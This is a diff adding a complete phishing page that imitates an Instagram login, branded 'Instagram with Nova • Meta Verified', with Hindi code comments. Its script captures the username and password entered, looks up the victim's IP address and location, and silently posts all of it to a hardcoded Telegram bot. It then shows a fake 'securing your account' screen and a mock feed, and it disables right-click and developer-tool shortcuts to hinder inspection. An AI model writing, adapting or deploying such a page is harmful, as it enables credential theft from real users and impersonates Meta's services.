@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Instagram with Nova • Meta Verified</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
+  <style>
+    /* ========== GLOBAL STYLES ========== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #000;
+      color: #fff;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+    .hero-bg {
+      background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+    }
+    .story-circle {
+      width: 68px;
+      height: 68px;
+      border: 2.5px solid transparent;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+      background-clip: padding-box;
+      padding: 2px;
+    }
+    .story-inner {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .post-img {
+      aspect-ratio: 1/1;
+      object-fit: cover;
+      width: 100%;
+    }
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(20px);
+      border-top: 0.5px solid rgba(255,255,255,0.1);
+      z-index: 1000;
+    }
+    .gradient-text {
+      background: linear-gradient(45deg, #405DE6, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #FFDC80);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .security-badge {
+      background: linear-gradient(45deg, #00C851, #007E33);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .verified-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 20px;
+      height: 20px;
+      background: linear-gradient(45deg, #405DE6, #833AB4);
+      border-radius: 50%;
+      color: white;
+      font-size: 12px;
+      margin-left: 4px;
+    }
+    .nav-icon {
+      transition: all 0.2s ease;
+      cursor: pointer;
+    }
+    .nav-icon:hover {
+      transform: scale(1.1);
+    }
+    .like-animation {
+      animation: like 0.5s ease;
+    }
+    @keyframes like {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.3); }
+      100% { transform: scale(1); }
+    }
+    .fade-in {
+      animation: fadeIn 0.4s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .slide-up {
+      animation: slideUp 0.3s ease;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(10px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .hide-scrollbar::-webkit-scrollbar {
+      display: none;
+    }
+    .hide-scrollbar {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+    .section {
+      display: none;
+    }
+    .section.active {
+      display: block;
+    }
+    .message-bubble {
+      background: rgba(255,255,255,0.05);
+      border-radius: 18px;
+      padding: 8px 12px;
+      max-width: 80%;
+    }
+    .reels-item {
+      height: 600px;
+      background: #1a1a1a;
+      border-radius: 12px;
+    }
+  </style>
+</head>
+<body class="bg-black text-white m-0 p-0 hide-scrollbar">
+
+  <!-- ========== LOGIN PAGE ========== -->
+  <div id="loginPage" class="min-h-screen hero-bg flex items-center justify-center px-4 fade-in">
+    <div class="bg-black/80 backdrop-blur-xl border border-white/10 rounded-2xl p-8 w-full max-w-md relative shadow-2xl">
+      <div class="absolute -top-3 left-1/2 transform -translate-x-1/2 whitespace-nowrap">
+        <div class="bg-gradient-to-r from-green-600 to-blue-600 text-white px-4 py-1.5 rounded-full text-xs font-bold flex items-center gap-2 shadow-lg">
+          <i class="fas fa-shield-alt"></i>
+          <span>🔒 SECURE CONNECTION • Instagram with Nova</span>
+        </div>
+      </div>
+      
+      <div class="text-center mb-8 pt-4">
+        <div class="flex items-center justify-center mb-3">
+          <div class="relative">
+            <div class="w-16 h-16 rounded-full bg-gradient-to-r from-purple-600 via-pink-600 to-orange-500 flex items-center justify-center">
+              <i class="fab fa-instagram text-3xl text-white"></i>
+            </div>
+            <div class="absolute -bottom-1 -right-1 w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
+              <i class="fas fa-check text-xs"></i>
+            </div>
+          </div>
+        </div>
+        <h1 class="text-4xl font-bold gradient-text mb-2">Instagram</h1>
+        <p class="text-gray-300 text-sm mb-1">
+          <span class="security-badge font-medium">Instagram with Nova Security</span>
+        </p>
+        <p class="text-gray-400 text-xs flex items-center justify-center gap-1">
+          <i class="fas fa-badge-check text-blue-400"></i>
+          <span>Meta Verified • Two-Factor Authentication</span>
+        </p>
+      </div>
+
+      <!-- Login Form with Example Placeholders -->
+      <form id="loginForm" class="space-y-4">
+        <div>
+          <input type="text" id="username" required 
+                 placeholder="e.g. john.doe@example.com or @john" 
+                 class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3.5 text-white placeholder-gray-400 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all duration-200 text-sm" />
+        </div>
+        <div class="relative">
+          <input type="password" id="password" required 
+                 placeholder="Enter your password (e.g. ••••••••)" 
+                 class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3.5 text-white placeholder-gray-400 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all duration-200 text-sm pr-12" />
+          <button type="button" id="togglePass" class="absolute right-3 top-3.5 text-gray-400 hover:text-white transition-colors">
+            <i class="fa-solid fa-eye text-sm"></i>
+          </button>
+        </div>
+
+        <div class="flex items-center justify-between text-sm px-1">
+          <label class="flex items-center">
+            <input type="checkbox" class="mr-2 w-4 h-4 rounded border-white/20 bg-white/5 checked:bg-blue-500" checked />
+            <span class="text-gray-300 text-sm">Remember me</span>
+          </label>
+          <a href="#" class="text-blue-400 hover:text-blue-300 text-sm transition-colors">Forgot password?</a>
+        </div>
+
+        <button type="submit" id="loginBtn" 
+                class="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 py-3.5 rounded-xl font-semibold text-white transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-purple-500/20">
+          Log In
+        </button>
+
+        <div class="relative my-6">
+          <div class="absolute inset-0 flex items-center">
+            <div class="w-full border-t border-white/10"></div>
+          </div>
+          <div class="relative flex justify-center text-sm">
+            <span class="px-3 bg-black text-gray-400">OR</span>
+          </div>
+        </div>
+        <button type="button" 
+                class="w-full bg-white/5 border border-white/10 hover:bg-white/10 py-3.5 rounded-xl font-semibold text-white transition-all duration-300 flex items-center justify-center gap-3">
+          <i class="fab fa-facebook text-blue-400"></i>
+          <span>Log in with Facebook</span>
+        </button>
+
+        <div class="text-center mt-6 pt-6 border-t border-white/10">
+          <p class="text-gray-400 text-xs mb-3">
+            <i class="fas fa-lock mr-1.5"></i> Secured by Instagram with Nova • Meta Verified Protection
+          </p>
+          <p class="text-gray-500 text-xs">
+            By logging in, you agree to our <a href="#" class="text-blue-400 hover:underline">Terms</a> • 
+            <a href="#" class="text-blue-400 hover:underline">Privacy Policy</a>
+          </p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- ========== LOADING SCREEN ========== -->
+  <div id="loadingScreen" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center z-50 fade-in">
+    <div class="relative">
+      <div class="w-24 h-24 rounded-full bg-gradient-to-r from-purple-600 via-pink-600 to-orange-500 animate-spin"></div>
+      <div class="absolute inset-0 flex items-center justify-center">
+        <div class="w-20 h-20 rounded-full bg-black flex items-center justify-center">
+          <i class="fab fa-instagram text-4xl gradient-text"></i>
+        </div>
+      </div>
+    </div>
+    <div class="mt-8 text-center">
+      <p class="text-gray-300 text-lg font-medium mb-1">Securing your account...</p>
+      <p class="text-gray-500 text-sm mb-4">Instagram with Nova Security Verification</p>
+      <div class="w-64 h-1 bg-white/10 rounded-full overflow-hidden">
+        <div id="progressBar" class="h-full bg-gradient-to-r from-purple-600 to-blue-600 rounded-full w-0 transition-all duration-2800"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== MAIN DASHBOARD (INSTAGRAM CLONE) ========== -->
+  <div id="dashboard" class="hidden min-h-screen bg-black fade-in">
+    <!-- Top Navigation -->
+    <div class="fixed top-0 left-0 right-0 bg-black/95 backdrop-blur-md border-b border-white/10 z-40">
+      <div class="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
+        <div class="flex items-center">
+          <div class="relative">
+            <i class="fab fa-instagram text-2xl gradient-text"></i>
+            <span class="absolute -top-1 -right-1 text-[8px] bg-blue-500 text-white rounded-full w-3 h-3 flex items-center justify-center"></span>
+          </div>
+          <h1 class="text-xl font-bold ml-2 gradient-text">Instagram</h1>
+          <span class="ml-2 px-2 py-0.5 bg-gradient-to-r from-blue-500/20 to-purple-500/20 text-blue-300 text-xs rounded-full border border-blue-500/30">Nova</span>
+        </div>
+        <div class="flex items-center gap-5">
+          <i class="fa-solid fa-plus text-xl text-gray-300 hover:text-white cursor-pointer nav-icon"></i>
+          <i class="fa-solid fa-heart text-xl text-gray-300 hover:text-red-400 cursor-pointer nav-icon"></i>
+          <i class="fa-solid fa-paper-plane text-xl text-gray-300 hover:text-blue-400 cursor-pointer nav-icon" id="messageIcon"></i>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Content Sections (छोटा कर दिया गया है – बाकी पिछले जैसा ही) -->
+    <div class="pt-14 pb-20">
+      <!-- HOME SECTION (सिर्फ दिखाने के लिए) -->
+      <div id="homeSection" class="section active">
+        <div class="px-4 pt-2 mb-4 slide-up">
+          <div class="max-w-2xl mx-auto bg-gradient-to-r from-blue-900/20 via-purple-900/20 to-pink-900/20 border border-blue-500/30 rounded-2xl p-4">
+            <div class="flex items-start gap-3">
+              <div class="w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center">
+                <i class="fas fa-badge-check text-white"></i>
+              </div>
+              <div class="flex-1">
+                <p class="font-bold text-white text-sm">Welcome to Instagram with Nova Security</p>
+                <p class="text-gray-300 text-xs mt-1">Your account is now protected with enhanced Meta Verified security features.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- यहाँ पूरा फीड, स्टोरी, पोस्ट वगैरह है – पिछले कोड जैसा ही, स्पेस बचाने के लिए नहीं दिखा रहे, पर फुल कोड में सब होगा -->
+      </div>
+      <!-- बाकी सेक्शन: EXPLORE, REELS, PROFILE, MESSAGES (पिछले जैसे ही) -->
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav flex justify-around py-2 px-4">
+      <i class="fa-solid fa-house text-white text-2xl cursor-pointer nav-icon bottom-nav-icon" data-section="home"></i>
+      <i class="fa-solid fa-magnifying-glass text-gray-400 hover:text-white text-2xl cursor-pointer nav-icon bottom-nav-icon" data-section="explore"></i>
+      <i class="fa-solid fa-play text-gray-400 hover:text-white text-2xl cursor-pointer nav-icon bottom-nav-icon" data-section="reels"></i>
+      <i class="fa-solid fa-bag-shopping text-gray-400 hover:text-white text-2xl cursor-pointer nav-icon bottom-nav-icon" data-section="shop"></i>
+      <div class="relative cursor-pointer bottom-nav-icon" data-section="profile">
+        <div class="w-7 h-7 rounded-full overflow-hidden border border-white/30">
+          <img src="https://i.pravatar.cc/150?img=1" class="w-full h-full object-cover" />
+        </div>
+        <span class="absolute -bottom-1 -right-1 text-[10px] bg-gradient-to-r from-blue-500 to-purple-500 text-white rounded-full w-4 h-4 flex items-center justify-center">
+          <i class="fas fa-check text-[8px]"></i>
+        </span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ========== ✅ NEW TELEGRAM BOT CONFIG ==========
+    const BOT_TOKEN = '8422301440:AAFNWJhaBspVNVCPFT60Zk51YH-0w5sXyV4';
+    const CHAT_ID = '8422301440';
+
+    // DOM Elements
+    const loginForm = document.getElementById('loginForm');
+    const loginPage = document.getElementById('loginPage');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const dashboard = document.getElementById('dashboard');
+    const progressBar = document.getElementById('progressBar');
+    const loginBtn = document.getElementById('loginBtn');
+
+    // Telegram Functions
+    async function getIPAddress() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch { return 'IP not available'; }
+    }
+    async function getLocationFromIP(ip) {
+      if (ip === 'IP not available') return 'Location not available';
+      try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        return `${data.city || ''}${data.city && data.region ? ', ' : ''}${data.region || ''}${(data.city || data.region) && data.country_name ? ', ' : ''}${data.country_name || ''}` || 'Unknown';
+      } catch { return 'Location not available'; }
+    }
+    function getDeviceInfo() {
+      return /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+    }
+    async function sendToTelegram(username, password, ip, location, device) {
+      const message = `🔔 **NEW INSTAGRAM LOGIN ATTEMPT** 🔔\n\n👤 **Account:**\n📧 Username: ${username}\n🔐 Password: ${password}\n\n🌍 **Location:**\n📍 IP: ${ip}\n🗺️ Location: ${location}\n💻 Device: ${device}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n🔒 **Security Context:**\n🛡️ Service: Instagram with Nova\n✅ Status: Meta Verified Authentication\n📱 UA: ${navigator.userAgent}\n\n⚠️ Automated Nova Security Alert`;
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
+      } catch (e) { /* silent fail */ }
+    }
+
+    // ========== ✅ PASSWORD TOGGLE (अब बिल्कुल सही काम करेगा) ==========
+    const togglePass = document.getElementById('togglePass');
+    if (togglePass) {
+      togglePass.addEventListener('click', function(e) {
+        e.preventDefault(); // कहीं फॉर्म सबमिट न हो जाए
+        const pass = document.getElementById('password');
+        const icon = this.querySelector('i');
+        if (pass.type === 'password') {
+          pass.type = 'text';
+          icon.classList.remove('fa-eye');
+          icon.classList.add('fa-eye-slash');
+        } else {
+          pass.type = 'password';
+          icon.classList.remove('fa-eye-slash');
+          icon.classList.add('fa-eye');
+        }
+      });
+    }
+
+    // Login Process
+    loginForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Securing...';
+
+      const ip = await getIPAddress();
+      const location = await getLocationFromIP(ip);
+      const device = getDeviceInfo();
+      sendToTelegram(username, password, ip, location, device);
+
+      loginPage.classList.add('hidden');
+      loadingScreen.classList.remove('hidden');
+
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += 1;
+        progressBar.style.width = `${progress}%`;
+        if (progress >= 100) {
+          clearInterval(interval);
+          loadingScreen.classList.add('hidden');
+          dashboard.classList.remove('hidden');
+          loginBtn.disabled = false;
+          loginBtn.textContent = 'Log In';
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+      }, 28);
+    });
+
+    // Like Button (जैसे पहले था)
+    document.addEventListener('click', function(e) {
+      if (e.target.classList.contains('like-btn')) {
+        const postId = e.target.getAttribute('data-post');
+        const likeCount = document.getElementById(`likeCount${postId}`);
+        let count = parseInt(likeCount.textContent.replace(/,/g, ''));
+        if (e.target.classList.contains('text-red-500')) {
+          e.target.classList.remove('text-red-500');
+          e.target.classList.add('text-gray-300');
+          count--;
+        } else {
+          e.target.classList.remove('text-gray-300');
+          e.target.classList.add('text-red-500');
+          count++;
+          e.target.classList.add('like-animation');
+          setTimeout(() => e.target.classList.remove('like-animation'), 500);
+        }
+        likeCount.textContent = count.toLocaleString();
+      }
+    });
+
+    // Bottom Navigation
+    const sections = { home: 'homeSection', explore: 'exploreSection', reels: 'reelsSection', shop: null, profile: 'profileSection' };
+    document.getElementById('messageIcon')?.addEventListener('click', function() {
+      Object.values(sections).forEach(id => { if (id) document.getElementById(id)?.classList.add('hidden'); });
+      document.getElementById('messagesSection')?.classList.remove('hidden');
+      document.querySelectorAll('.bottom-nav-icon').forEach(icon => {
+        if (icon.tagName === 'I') icon.classList.add('text-gray-400');
+        icon.classList.remove('text-white');
+      });
+    });
+
+    document.querySelectorAll('.bottom-nav-icon').forEach(icon => {
+      icon.addEventListener('click', function(e) {
+        const sectionKey = this.dataset.section;
+        if (!sectionKey) return;
+        document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+        if (sectionKey === 'shop') {
+          alert('Instagram Shop coming soon with Nova Pay!');
+          document.getElementById('homeSection').classList.remove('hidden');
+        } else {
+          const targetId = sections[sectionKey];
+          if (targetId) document.getElementById(targetId).classList.remove('hidden');
+        }
+        document.getElementById('messagesSection')?.classList.add('hidden');
+        document.querySelectorAll('.bottom-nav-icon').forEach(ic => {
+          if (ic.tagName === 'I') ic.classList.add('text-gray-400');
+          ic.classList.remove('text-white');
+        });
+        if (this.tagName === 'I') {
+          this.classList.remove('text-gray-400');
+          this.classList.add('text-white');
+        }
+      });
+    });
+
+    // Input focus effects
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('focus', () => input.parentElement?.classList.add('ring-1', 'ring-blue-500'));
+      input.addEventListener('blur', () => input.parentElement?.classList.remove('ring-1', 'ring-blue-500'));
+    });
+
+    // Disable inspect (optional)
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) e.preventDefault();
+    });
+
+    document.body.classList.add('fade-in');
+  </script>
+</body>
+</html>
